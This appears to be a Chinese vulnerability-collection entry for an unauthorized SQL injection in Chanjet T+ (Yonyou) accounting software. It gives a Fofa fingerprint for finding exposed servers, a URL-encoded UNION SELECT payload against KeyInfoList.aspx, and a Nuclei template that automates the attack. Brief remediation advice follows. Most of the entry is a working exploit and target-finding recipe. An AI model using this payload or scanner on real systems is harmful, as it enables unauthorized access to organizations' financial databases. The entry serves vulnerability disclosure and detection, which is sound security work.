# 畅捷通T+tplus接口存在未授权访问+SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app ="畅捷通 T+"`
- **请求**：`GET /tplus/UFAQD/KeyInfoList.aspx?preload=1&zt=1%27%29%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%40%40%76%65%72%73%69%6f%6e%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2d%2d%20%4d%52%46%7a HTTP/1.1`

**请求体 / payload**
```
1. Fofa
app ="畅捷通 T+"
Host:
1. 部分界面如下
1. Nuclei
id: changjietong-tplus-sql
info:
name: changjietong-tplus-sql
author: HackTwo
severity: high
http:
- raw:
- +
@timeout: 30s
GET /tplus/UFAQD/KeyInfoList.aspx?preload=1&zt=1%27%29%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%40%40%76%65%72%73%69%6f%6e%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2d%2d%20%4d%52%46%7a HTTP/1.1
Host: {{Hostname}}
max-redirects: 3
matchers-condition: and
matchers:
- type: word
part: body
words:
- 'SQL Server'
condition: and
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。